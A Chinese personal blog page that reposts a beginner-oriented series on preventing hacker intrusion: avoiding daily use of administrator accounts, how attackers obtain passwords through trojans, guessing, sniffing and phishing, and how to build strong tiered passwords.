<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>胡小宁的博客</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="胡小宁的博客"><meta name="msapplication-TileImage" content="/images/本人.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="胡小宁的博客"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="胡小宁的博客"><meta property="og:url" content="http://1905060202.github.io/"><meta property="og:site_name" content="胡小宁的博客"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://1905060202.github.io/img/og_image.png"><meta property="article:author" content="胡小宁"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://1905060202.github.io"},"headline":"胡小宁的博客","image":["http://1905060202.github.io/img/og_image.png"],"author":{"@type":"Person","name":"胡小宁"},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/monokai.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><script data-ad-client="1" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/%E6%9C%AC%E4%BA%BA.jpg" alt="胡小宁的博客" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">主页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于我</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T16:21:38.000Z" title="2021/7/17 上午12:21:38">2021-07-17</time>发表</span><span class="level-item"><time dateTime="2021-07-16T16:36:13.513Z" title="2021/7/17 上午12:36:13">2021-07-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></span><span class="level-item">3 小时读完 (大约27839个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/17/%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%EF%BC%9F/">如何防范黑客入侵？</a></h1><div class="content"><h1 id="如何防止黑客入侵-1-：避免使用高权限用户"><a href="#如何防止黑客入侵-1-：避免使用高权限用户" class="headerlink" title="如何防止黑客入侵[1]：避免使用高权限用户"></a>如何防止黑客入侵[1]：避免使用高权限用户</h1><p><strong>文章目录</strong></p>
<p>★基本概念扫盲<br>★反面教材<br>★危害性<br>★你该如何做？<br>★可能的麻烦</p>
<p>　　为啥俺把这个话题列在头一条？——因为这是个非常普遍、且远远没有得到重视的问题。根据俺的经验，如果你能够养成好习惯，【不】使用高权限用户（尤其是管理员）进行日常操作，就可以大大降低被黑的概率。下面，俺就来具体介绍一下。</p>
<h2 id="★基本概念扫盲"><a href="#★基本概念扫盲" class="headerlink" title="★基本概念扫盲"></a>★基本概念扫盲</h2><p>　　考虑到本文是面向外行人士，先进行一下名词解释。</p>
<h3 id="◇用户权限"><a href="#◇用户权限" class="headerlink" title="◇用户权限"></a>◇用户权限</h3><p>　　所谓的“用户权限”，通俗地说，就是某个用户的权力有多大。权力越大，能干的事情越多。</p>
<h3 id="◇用户组"><a href="#◇用户组" class="headerlink" title="◇用户组"></a>◇用户组</h3><p>　　用户组，顾名思义，就是一组用户的集合。<br>　　在主流的操作系统中，“用户权限”通常是和“用户组”挂钩滴。针对不同的用户组，分配了不同的权限。<br>　　为了让用户省事儿，Windows 系统内置了若干用户组（比如：Users、Power Users、Guests、等）。这些内置的用户组，事先已经预定义好若干用户权限。</p>
<h3 id="◇高权限用户"><a href="#◇高权限用户" class="headerlink" title="◇高权限用户"></a>◇高权限用户</h3><p>　　本文提及的【高权限用户】，主要是指 Windows 系统中 Administrators 组的用户或 Linux/Unix 系统中 root 组的用户。<br>　　另外，顺便消除一个误解。很多菜鸟以为：Windows 系统中，只有用户名为“Administrator”的用户才具有管理员权限。其实捏，任何一个用户，即使用户名不叫“Administrator”，只要是属于“Administrators 组”，也同样具有管理员权限。</p>
<h2 id="★反面教材"><a href="#★反面教材" class="headerlink" title="★反面教材"></a>★反面教材</h2><p>　　菜鸟的例子就不提了，光说说俺接触过的很多程序员吧。这帮家伙在使用 Linux/Unix 系统进行开发时，都晓得应该用普通用户的帐号进行操作；当需要做某些高级权限的操作，再切换到管理员帐号（root 帐号）。但即便是这些开发人员，在自己的 Windows 系统中，却喜欢用管理员（Administrator）进行日常操作，实在是很讽刺。<br>　　如果连 IT 专业的开发人员都这样，那不太懂技术的菜鸟，就可想而知了。</p>
<h2 id="★危害性"><a href="#★危害性" class="headerlink" title="★危害性"></a>★危害性</h2><p>　　如果你平时总是用管理员权限登录到系统并进行日常工作，那就意味着你所运行的每一个程序，同时也具有了管理员权限。要知道，管理员权限的权力是非常大滴——几乎可以干任何事情。<br>　　假设你有上述【坏】习惯。某天，你从网上下载了一个软件，且软件已经感染了病毒。那么，当你运行这个软件时，这个病毒就会被激活。更要命的是，它也同样具有【管理员权限】。也就是说，病毒获得了与杀毒软件平起平坐的地位。假如这个病毒的作者水平再高一些，甚至可以骗过杀毒软件或者直接把杀毒软件干掉。<br>　　除了病毒，木马也是一样。假设你上网的时候，一不留神访问了某个挂马的网站。一旦木马被激活，也同样是以【管理员权限】运行，危害同样也巨大。</p>
<h2 id="★你该如何做？"><a href="#★你该如何做？" class="headerlink" title="★你该如何做？"></a>★你该如何做？</h2><p>　　考虑到 Windows 系统的用户占绝大多数，俺就光拿 Windows 系统来说事儿。希望 Linux 及 Mac OS 的 fans 不要见怪哦。<br>　　为了尽量少用高权限用户。你最好刚装好系统之后，单独创建一个非管理员用户。</p>
<p><img src="https://lh6.googleusercontent.com/WH5jStjSfrIiS7K23a7P7djloFJwbpO68Mba5QM30svmTqiUY5e2PKGp8tCwXKJ3FAm9mMia1FqR8vbhj8KO_wCZEy4M2a2RuoGwXt5FkbdRuuNUqgWmCeas3Z31" alt="不见图、请翻墙"></p>
<p>　　你可以让该用户仅仅属于“Power Users 组”，如下图：</p>
<p><img src="https://lh4.googleusercontent.com/HTwKLKC6pIatq9iWzj0RLDHxTbv5LqR2CtMAptU6INKFBgW6iWLhZgDayWjvHLqXmSrWFcYq9MzORqogF1EFVnjwzR_ql9OYuD15fWAc2iiMRn1OL_MQSMH09pqc" alt="不见图、请翻墙"></p>
<p>　　如果想更安全的话，可以只加入“Users 组”，今后，就主要通过这个用户进行日常的操作。如下图：</p>
<p><img src="https://lh6.googleusercontent.com/BRpPpLliuAgsOOUYdc7kfZs37JRnq2zhT6JcsExN1yXhc9-mEPCR_WNnvkYAIesHDmFyiA_QkfjL6y5znzkvf5JsXH_akCNpljtufIbPeeUpAOreI7AFiJs_QycZ" alt="不见图、请翻墙"></p>
<p>　　考虑到有些同学不了解这两个用户组，在权限方面与管理员有啥区别。俺简单列举一下。</p>
<h3 id="◇“Power-Users组”与“Administrators-组”的差别"><a href="#◇“Power-Users组”与“Administrators-组”的差别" class="headerlink" title="◇“Power Users组”与“Administrators 组”的差别"></a>◇“Power Users组”与“Administrators 组”的差别</h3><p>　　相对于“Administrators 组”，“Power Users 组”缺少了如下几项权限（俺只列主要的）：<br>\1. 不能添加、删除、禁用系统中的其它用户。<br>\2. 不能修改其它用户的属性（包括口令、所属的用户组、等）<br>\3. 不能安装/卸载硬件驱动程序。<br>\4. 不能安装/卸载某些应用软件。<br>\5. 不能查看系统的安全日志。</p>
<h3 id="◇“Users-组”与“Administrators-组”的差别"><a href="#◇“Users-组”与“Administrators-组”的差别" class="headerlink" title="◇“Users 组”与“Administrators 组”的差别"></a>◇“Users 组”与“Administrators 组”的差别</h3><p>　　“Users 组”的权限比“Power Users 组”更小。除了“Power Users 组”做不到的事情，“Users 组”还【缺少】如下权限（俺只列主要的）：<br>\1. 不能修改系统时间。<br>\2. 不能修改某些系统目录（包括：系统盘的 <code>\WINDOWS</code> 目录、系统盘的 <code>\WINDOWS\SYSTEM32</code> 目录、系统盘的 <code>\Program Files</code> 目录）。<br>\3. 不能启动/停止某些系统服务。<br>\4. 不能修改注册表 <code>HKEY_LOCAL_MECHINE</code> 下的所有键值。</p>
<p>　　从上述对照，明显可知，“Users 组”的权限更小，使用起来更安全。比如说，即使你运行了一个带毒的程序，由于病毒和你一样，也仅有“Users 组”的权限。所以病毒也就无法修改/破坏重要的系统目录，掀不起太大风浪。</p>
<h2 id="★可能的麻烦"><a href="#★可能的麻烦" class="headerlink" title="★可能的麻烦"></a>★可能的麻烦</h2><p>　　通常来说，越安全的措施，往往也意味着越麻烦。但是这些麻烦，都有相应的解决之道。</p>
<h3 id="◇切换用户的麻烦"><a href="#◇切换用户的麻烦" class="headerlink" title="◇切换用户的麻烦"></a>◇切换用户的麻烦</h3><p>　　当你以普通用户身份登录后，可能由于某些原因，需要用管理员用户干点事情。但是你（可能是开了很多程序）又不想把当前用户注销。<br>　　俺的建议是：使用【快速用户切换】（洋文叫：Fast User Switching）功能来切换用户。此功能从 Windows XP 开始提供。简单地说，就是可以让几个不同的用户同时登录同一个系统，平滑地切换。有了此功能，这个麻烦就不明显啦。</p>
<p>　　如果你非常不幸，还在使用比较古老的 Windows 2000 系统；或者你使用的是 Windows 的服务版本（比如 Windows Server 2003）。在这些版本的 Windows 系统中，默认是没有“快速用户切换”功能滴。这可咋办捏？<br>　　俺的建议是：<br>　　可以在【不】注销当前用户的情况下，以另一个用户（比如管理员）启动某个需要更高权限的程序。为了说清楚，举例如下：<br>　　假设你当前处于一个普通用户的环境，但是想另外启动一个具有管理员权限的程序，比如说命令行程序（cmd.exe）。<br>\1. 你先创建一个指向 <code>cmd.exe</code> 的快捷方式。（该咋样创建快捷方式，就不用俺来教了吧？）<br>\2. 用鼠标选中该快捷方式，在快捷菜单（右键菜单）中，选择“属性”菜单项。出现如下对话框。</p>
<p><img src="https://lh3.googleusercontent.com/wDy02yigImXIySuFYQHMtWPnKw6FNI3iEsUFbqiw-2y-gRFLesDX_kzUw3YXKm93XcPY933FVIqb1VXywe2jcA7fKmxEXDyW3k44flkdE1Vcsvx6OoUOyiVHSjUG" alt="不见图、请翻墙"></p>
<p>\3. 在该对话框中，点“高级”按钮。出现如下对话框。把“以其他用户身份运行”选项打勾，即可。至此，快捷方式创建完毕。</p>
<p><img src="https://lh3.googleusercontent.com/X47byUOJ2PtD7Smq9ArZdUFPjBjrCgrkY9lYSdWnTB7RIHUq1ByRDxtDL9v09Nk5eACHC4RzZDcV0RT9-adVQ77RxwGOqACe0YPpC_UgOEsSX4bp85kbWWlKwFJn" alt="不见图、请翻墙"></p>
<p>\4. 以后，如果你想在普通用户环境中，以管理员身份执行命令行，只需点击该快捷方式，就会弹出如下对话框。然后在该对话框中输入管理员的用户名和口令，就能以管理员的身份，把该命令行启动起来。</p>
<p><img src="https://lh5.googleusercontent.com/vULI8x0WJ0XStJdYnN3G-t4Dj_Pr0YTzB-vyOVnANH04M2I6UXVOs49EJDwBS0Ba6Rq9pc0-JcekxJvrIrWh7mr2CzTGnVMr6LFAsQFlLf7w479G9PLEQWSW3-Ia" alt="不见图、请翻墙"></p>
<h3 id="◇安装软件-驱动的麻烦"><a href="#◇安装软件-驱动的麻烦" class="headerlink" title="◇安装软件/驱动的麻烦"></a>◇安装软件/驱动的麻烦</h3><p>　　安装驱动总是需要【管理员权限】才行；另外，很多软件（比如 MS Office）在安装时，也要求用【管理员权限】进行。<br>　　俺的建议是：<br>　　在刚装好系统之后，先用管理员用户把上述这些软件/驱动程序都搞好。然后，就无需再用管理员用户了。毕竟你经常使用的软件相对固定，不可能三天两头安装软件或驱动（除非你是软/硬件发烧友）。即便偶尔需要重新装个软件或驱动，也可以用上述介绍的方式，【临时】切换到管理员权限。</p>
<h3 id="◇修改系统时间的麻烦"><a href="#◇修改系统时间的麻烦" class="headerlink" title="◇修改系统时间的麻烦"></a>◇修改系统时间的麻烦</h3><p>　　如果你平时用的是“Users 组”而不是“Power Users 组”，那你连修改系统时间的权限也没有。<br>　　俺的建议是：<br>　　启用 Windows 系统自带的时间同步服务，让它帮你自动同步系统时间。</p>
<p>　　除了上述这几点，如果还有谁碰到其它的麻烦，也欢迎来信跟俺交流。俺会补充到本文中。本系列的下一个帖子，将会介绍攻击者是如何搞定你的口令/密码</p>
<h1 id="如何防止黑客入侵-2-：攻击者如何搞定你的口令-密码？"><a href="#如何防止黑客入侵-2-：攻击者如何搞定你的口令-密码？" class="headerlink" title="如何防止黑客入侵[2]：攻击者如何搞定你的口令/密码？"></a>如何防止黑客入侵[2]：攻击者如何搞定你的口令/密码？</h1><p><strong>文章目录</strong></p>
<p>★使用密码的场合（密码的类型）<br>★攻击者如何通过技术手段搞定的你的密码？<br>★攻击者如何通过【非技术】手段搞定的你的密码？<br>★结尾</p>
<p>　　在上文，俺强调了高权限用户的潜在风险。接下来，咱要介绍一下，和口令相关的安全话题。毕竟在大伙儿的日常生活中，口令的使用是必不可少滴。<br>　　考虑到和口令相关的内容较多，俺分两部分来说：今天首先揭露攻击者的种种伎俩；下一帖再详述应对的措施。</p>
<h2 id="★使用密码的场合（密码的类型）"><a href="#★使用密码的场合（密码的类型）" class="headerlink" title="★使用密码的场合（密码的类型）"></a>★使用密码的场合（密码的类型）</h2><p>　　为了便于后面的叙述，俺有必要先总结一下，使用口令的几种场合。<br>　　针对这几种不同的场合，攻击者会采取不同的攻击手法；因此，大伙儿也要采取针对性的防范手法。</p>
<h3 id="◇操作系统用户的口令"><a href="#◇操作系统用户的口令" class="headerlink" title="◇操作系统用户的口令"></a>◇操作系统用户的口令</h3><p>　　这种场合应该好理解。目前主流的操作系统都具有口令验证的用户登录机制。</p>
<h3 id="◇各种网络应用的口令"><a href="#◇各种网络应用的口令" class="headerlink" title="◇各种网络应用的口令"></a>◇各种网络应用的口令</h3><p>　　随着网络（尤其是 Web）的普及，这种场合越来越多。比如：电子邮件（Email）、即时通讯（IM）、论坛（BBS）、上网炒股、等，都需要有用户口令认证。</p>
<h3 id="◇各种本地应用程序的口令"><a href="#◇各种本地应用程序的口令" class="headerlink" title="◇各种本地应用程序的口令"></a>◇各种本地应用程序的口令</h3><p>　　此种场合可能不如网络应用的口令那么常见。比如：用口令加密的压缩文件、用口令加密的 Office 文档、PGP 密钥的口令、Outlook 设置的启动口令……</p>
<h3 id="◇其它"><a href="#◇其它" class="headerlink" title="◇其它"></a>◇其它</h3><p>　　除了上述3种类型，其它那些比较少见、杂七杂八的，统统归为其它。比如：BIOS 的开机口令。</p>
<h2 id="★攻击者如何通过技术手段搞定的你的密码？"><a href="#★攻击者如何通过技术手段搞定的你的密码？" class="headerlink" title="★攻击者如何通过技术手段搞定的你的密码？"></a>★攻击者如何通过技术手段搞定的你的密码？</h2><p>　　前面列举了密码的不同使用场合。接着咱要介绍一下：攻击者会利用哪些技术手段，攻破你的密码。</p>
<h3 id="◇木马盗取"><a href="#◇木马盗取" class="headerlink" title="◇木马盗取"></a>◇木马盗取</h3><p>　　如果你的电脑已经被攻击者安装了木马，那你的一举一动有可能都会被监视。在这种情况下，你在这台电脑上输入的任何密码，都将会被攻击者获取。所以，这种情况是很危险滴——不管是哪种类型的密码，都可能被盗。<br>　　至于如何防止自己的计算机被植入木马，【不是】本帖的重点。俺会在本系列后续的帖子中专门介绍木马的防范。</p>
<h3 id="◇弱密码猜解"><a href="#◇弱密码猜解" class="headerlink" title="◇弱密码猜解"></a>◇弱密码猜解</h3><p>　　所谓的“弱密码猜解”，就是说：如果你的密码比较弱，攻击者就容易猜出来。这种攻击手法，对于操作系统用户口令、网络应用口令、本地应用口令，统统适用。<br>　　而且攻击者在盗取口令的时候，通常会先尝试进行弱口令猜测。为啥捏？因为大部分用户都不太具有安全意识，口令都会比较简单（比较弱）。并且，根据【二八原理】，绝大多数的傻瓜用户会使用极少数的弱口令。所以，攻击者先把最流行的那些个弱口令挨个试验一遍，没准就已经成功了。<br>　　为了让大伙明白弱口令的严重程度，来看看2009年底的“<a target="_blank" rel="noopener" href="https://www.cnbeta.com/articles/100093.htm">一个案例</a>”。<br>　　话说国外一个小有名气的交友网站（RockYou）被黑客攻破。里面大约3260万用户数据被盗。更加杯具的是，RockYou 采用明文方式存储用户的口令。因此，这3260万用户的口令也统统暴露鸟。后来有好事者把被盗的用户口令拿来分析一番。结果发现，有相当多的用户在使用一些极其弱智的口令。<br>　　用的最多的 TOP 10 分别是：</p>
<blockquote>
<p>\1. 123456<br>\2. 12345<br>\3. 123456789<br>\4. password<br>\5. iloveyou<br>\6. princess<br>\7. rockyou<br>\8. 1234567<br>\9. 12345678<br>\10. abc123</p>
</blockquote>
<p>　　据说名列第一的口令（123456）有30万人使用，真是不看不知道，一看吓一跳啊！</p>
<h3 id="◇暴力破解"><a href="#◇暴力破解" class="headerlink" title="◇暴力破解"></a>◇暴力破解</h3><p>　　除了对弱密码进行猜解，攻击者还可以通过穷举的的方式，破解中等强度的密码。所谓的穷举法，就是把所有可能的字母/数字的组合都试验一遍，直到找到正确的密码。<br>　　现在 CPU 的计算能力日新月异，尤其是多核 CPU/GPU 普及之后，暴力破解的效果会越来越好。你的密码必须【很强】，才能彻底消除暴力的风险。<br>　　由于这种攻击手法，需要进行成千上万次的试错，所以比较适合针对本地应用的口令（比如破解加密的压缩文件），而不太适合对网络应用进行在线口令破解。<br>　　在下一个帖子，俺会介绍《如何构造安全的口令/密码》。</p>
<h3 id="◇网络传输截获（嗅探）"><a href="#◇网络传输截获（嗅探）" class="headerlink" title="◇网络传输截获（嗅探）"></a>◇网络传输截获（嗅探）</h3><p>　　在这种方式下，攻击者会通过【嗅探】的方式，分析你的上网数据。如果你在上网过程中，存在明文传输的口令，就会被截获。<br>　　非安全专业的网友，可能不太明白什么是“嗅探”，俺来稍微解释一下。攻击者会利用某些嗅探软件，收集网络上传输的所有数据。这个过程好比电话窃听。嗅探软件类似于窃听器；你的上网数据类似于电话的通话内容。<br>　　这几年，随着现在无线网络（WiFi）的普及，网络嗅探的风险大大增加，列位看官切不可掉以轻心哦。</p>
<h3 id="◇客户端截获"><a href="#◇客户端截获" class="headerlink" title="◇客户端截获"></a>◇客户端截获</h3><p>　　所谓“客户端截获”，通常是针对网络应用的口令而言。举几个例子。<br>　　举例1：<br>　　很多网友上网时，为了免去输入口令的麻烦，会让浏览器帮忙记住口令。通常浏览器会把这些口令保存在某个文件中（可能以明文方式，也可能以密文方式）。如果某天你的电脑中了木马，那么木马程序有可能会盗走这个保存口令的文件。然后攻击者就可以通过分析该文件，破解出你保存过的所有网络应用的口令。<br>　　举例2：<br>　　如果你是软件公司的开发人员，多半你会使用某种源代码版本管理工具（比如 SVN、CVS、等）。为了免去每次操作时输入口令的麻烦。通常开发人员会让这些客户端软件记住用户名和口令。如果哪天你中了木马，或者笔记本电脑被盗，那么攻击者同样可以破解你保存下来的口令，进而用你的身份盗取源代码。</p>
<h3 id="◇服务端截获"><a href="#◇服务端截获" class="headerlink" title="◇服务端截获"></a>◇服务端截获</h3><p>　　和“客户端截获”方式相对的，还有“服务端截获”。具体是啥意思捏？俺来解释一下。<br>　　凡是利用口令进行验证的软件系统，都需要存储和口令相关的信息。否则的话，软件系统就无法验证用户输入的口令。如果攻击者能够拿到这些口令的关联信息，那他/她就有可能分析出口令是啥。<br>　　（如果你不是搞 IT 专业滴，下面这段可能看不太明白。不过没关系，不影响你理解后续章节）<br>　　简而言之，通常有三种方式来存储口令的关联信息：1、存储口令的明文；2、存储口令经过加密后的密文；3、存储口令的散列值。<br>　　第一种方式是最土鳖的，稍微先进一些的系统，都不这么干了。后面两种方式，虽然看不到明文，但是攻击者还是有可能通过某种技术手段，反推出口令的明文。具体细节，本文就不再多说了。<br>　　那攻击者如何获得存储在软件系统的口令关联信息捏？其实前面提到的 RockYou 网站的杯具，就是一个很好的例子。俺再举另一个例子。<br>　　比如说：某个 Linux/Unix 服务器存在安全漏洞，攻击者利用此漏洞搞到了 <code>/etc/shadow</code> 文件。那么攻击者就可以采用上述提到的暴力破解的招数，攻破该服务器上所有强度较弱的口令。</p>
<h2 id="★攻击者如何通过【非技术】手段搞定的你的密码？"><a href="#★攻击者如何通过【非技术】手段搞定的你的密码？" class="headerlink" title="★攻击者如何通过【非技术】手段搞定的你的密码？"></a>★攻击者如何通过【非技术】手段搞定的你的密码？</h2><p>　　说完了技术手段，自然就得再说说【非】技术手段。所谓的非技术手法，也就是社会工程学手法。用于盗取密码的社会工程学手法，大概有如下几种。</p>
<h3 id="◇偷窥"><a href="#◇偷窥" class="headerlink" title="◇偷窥"></a>◇偷窥</h3><p>　　偷窥是最简单的一种社会工程学攻击手法。虽然简单，但是有效。比如很多盗取银行卡的家伙，就是偷窥的手法，得到被害人的银行卡密码。</p>
<h3 id="◇网络钓鱼（phishing）"><a href="#◇网络钓鱼（phishing）" class="headerlink" title="◇网络钓鱼（phishing）"></a>◇网络钓鱼（phishing）</h3><p>　　另外一个骗取口令的方式，就是通过网络钓鱼。比如某些攻击者，会伪造一个银行的网站。其界面和真实的网站一模一样。然后通过某种方式（比如：虚假链接、欺诈邮件、DNS 欺骗 …），引诱你到这个网站上。由于假网站和真网站的界面很像，你可能信以为真，然后在假网站中输入你的用户名和密码。<br>　　有些高明的钓鱼网站，会采用类似Web代理的技巧：把你的所有输入操作，转而提交给真网站；然后把真网站输出的界面，再转回给受害者看。这样的话，受害者就跟在真实网站进行插作，没啥区别，不易看出破绽。<br>　　更多关于网络钓鱼的介绍，可以参见维基百科的“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB">这个页面</a>”。</p>
<h3 id="◇分析"><a href="#◇分析" class="headerlink" title="◇分析"></a>◇分析</h3><p>　　如果攻击者对你比较了解，那么他有可能通过深入的分析，攻破你的口令防护。<br>　　有木有觉得很神奇？很匪夷所思？其实这种招数很常见，且不算太难。俺来举个例子。<br>　　相信很多网友都用过电子邮箱的找回口令功能。当你口令遗忘之后，可以通过回答事先预设的问题，来找回口令。很多不太专业的用户，预设的问题都很简单（比如：你的手机号是多少？比如：你的生日是哪天？）。对于这类过于简单的问题，攻击者可以很容易地找到答案，从而窃取到你的邮箱口令。</p>
<h3 id="◇欺骗"><a href="#◇欺骗" class="headerlink" title="◇欺骗"></a>◇欺骗</h3><p>　　最近几年，通过电话诈骗，骗取银行卡密码的案例越来越多。这种作案手法，就属于社会工程学中，“欺骗”的范畴。其实在IT领域，某些黑客也会利用这种手法来获取口令。</p>
<h2 id="★结尾"><a href="#★结尾" class="headerlink" title="★结尾"></a>★结尾</h2><p>　　介绍到这里，列位看官对黑客盗取口令的手法，应该有一个初步的认识了。本系列的下一个帖子，具体介绍如何构造安全的口令/密码。</p>
<h1 id="如何防止黑客入侵-3-：如何构造安全的口令-密码"><a href="#如何防止黑客入侵-3-：如何构造安全的口令-密码" class="headerlink" title="如何防止黑客入侵[3]：如何构造安全的口令/密码"></a>如何防止黑客入侵[3]：如何构造安全的口令/密码</h1><p><strong>文章目录</strong></p>
<p>★【不要】共用口令/密码<br>★密码的【分级机制】<br>★一些反面教材——【脆弱】密码的举例<br>★如何构造【复杂】密码？<br>★结尾</p>
<p>　　在上文，俺介绍了攻击者，是如何攻破口令这道关口的。为了避免口令被轻易地破解，有必要了解构造安全密码的技巧。所以，今天就来介绍此话题。</p>
<h2 id="★【不要】共用口令-密码"><a href="#★【不要】共用口令-密码" class="headerlink" title="★【不要】共用口令/密码"></a>★【不要】共用口令/密码</h2><p>　　俺发现有相当多的同学喜欢靠一个口令包打天下。这是相当相当危险的事情。同一个口令，用的场合越多，则泄密的危险越大。而一旦泄露，你的安全防线就会全面崩溃。<br>　　所以，今天要讲的头一个要点，就是绝对不要在所有（大多数）场合，使用同一个口令。</p>
<h2 id="★密码的【分级机制】"><a href="#★密码的【分级机制】" class="headerlink" title="★密码的【分级机制】"></a>★密码的【分级机制】</h2><p>　　由于共用口令存在很大的风险，比较稳妥的办法就是——每一个场合仅使用一个密码。但是很多人会抱怨说：这样会很繁琐，增加了很多的麻烦。那如何才能做到既安全，又不太麻烦捏？这就要引入密码的分级机制。<br>　　根据安全圈内一个人所共知的常识：越安全的措施，通常也就越麻烦，成本也高；反之亦然。另外，根据<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2009/02/80-20-principle-0-overview.html">二八原理</a>，非常重要口令毕竟只占少数。所以，就像电影要有分级机制一样，你的密码/口令也要引入分级的概念。通过分级机制，对大多数不太重要的口令，可以采取简化的安全措施；而对少数重要的口令，采取高度安全的措施。<br>　　下面，就来介绍一下，如何对不同的口令，进行分类。</p>
<h3 id="◇第1级：不重要的口令"><a href="#◇第1级：不重要的口令" class="headerlink" title="◇第1级：不重要的口令"></a>◇第1级：不重要的口令</h3><p>　　所谓不重要的口令，就是说万一被盗了或者忘记了，对你没啥损失。<br>　　比如，俺经常碰到一些土鳖的论坛，只允许注册会员从上面下载附件。因此俺就经常临时注册一个账号，然后登录上去下载东西。这类账号，基本上都属于一次性的（用完即扔），所以重要程度很低。<br>　　对于那些不重要的口令，基本上不用考虑太多安全性的因素。随便设置一个即可。</p>
<h3 id="◇第2级：重要但少用的口令"><a href="#◇第2级：重要但少用的口令" class="headerlink" title="◇第2级：重要但少用的口令"></a>◇第2级：重要但少用的口令</h3><p>　　对于重要的口令，还要根据其使用的频繁程度，再区别对待。有些口令虽然重要，但是使用的频度很低。由于这类口令很少使用，所以设置得麻烦一些，问题也不大。<br>　　比如俺管理的一些研发的服务器（比如源代码服务器），其重要程度非常高，但是平常基本无需登录。</p>
<h3 id="◇第3级：重要且频繁使用的口令"><a href="#◇第3级：重要且频繁使用的口令" class="headerlink" title="◇第3级：重要且频繁使用的口令"></a>◇第3级：重要且频繁使用的口令</h3><p>　　最后这类口令，既重要，又经常用。所以，设置这类口令就比较讲究。要同时兼顾安全性和易用性。<br>　　比如自己日常使用的操作系统用户密码，就属于此类。</p>
<h2 id="★一些反面教材——【脆弱】密码的举例"><a href="#★一些反面教材——【脆弱】密码的举例" class="headerlink" title="★一些反面教材——【脆弱】密码的举例"></a>★一些反面教材——【脆弱】密码的举例</h2><p>　　说完了分级机制。接下来俺先列举一些反面教材，让大伙儿看看，啥样的口令算是脆弱的？（顺便说一下：2011年底，国内各大网站纷纷被脱库。）</p>
<h3 id="◇口令和用户名一样"><a href="#◇口令和用户名一样" class="headerlink" title="◇口令和用户名一样"></a>◇口令和用户名一样</h3><p>　　无需多说，这种情形的口令，非常脆弱。</p>
<h3 id="◇口令是一串简单数字"><a href="#◇口令是一串简单数字" class="headerlink" title="◇口令是一串简单数字"></a>◇口令是一串简单数字</h3><p>　　在上文，俺举了<a target="_blank" rel="noopener" href="http://internet.solidot.org/article.pl?sid=09/12/15/114224">RockYou 网站用户数据被盗</a>的案例。在该网站3200万用户中，最受欢迎的十大弱智口令分别是：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span>  123456<br><span class="hljs-bullet">2.</span>  12345<br><span class="hljs-bullet">3.</span>  123456789<br><span class="hljs-bullet">4.</span>  password<br><span class="hljs-bullet">5.</span>  iloveyou<br><span class="hljs-bullet">6.</span>  princess<br><span class="hljs-bullet">7.</span>  rockyou<br><span class="hljs-bullet">8.</span>  1234567<br><span class="hljs-bullet">9.</span>  12345678<br><span class="hljs-bullet">10.</span> abc123<br></code></pre></td></tr></table></figure>

<p>　　从这个 TOP 10 可以看出，有一半是采用连续数字。所以，用连续的数字串（包括顺序和逆序）作密码，也是很愚昧滴。</p>
<h3 id="◇口令太短"><a href="#◇口令太短" class="headerlink" title="◇口令太短"></a>◇口令太短</h3><p>　　如果你的口令小于6个字符，是很容易被暴力破解滴。毕竟，小于6个字符的所有组合，也没多少个。对专门穷举密码程序来说，那简直是小菜一碟。</p>
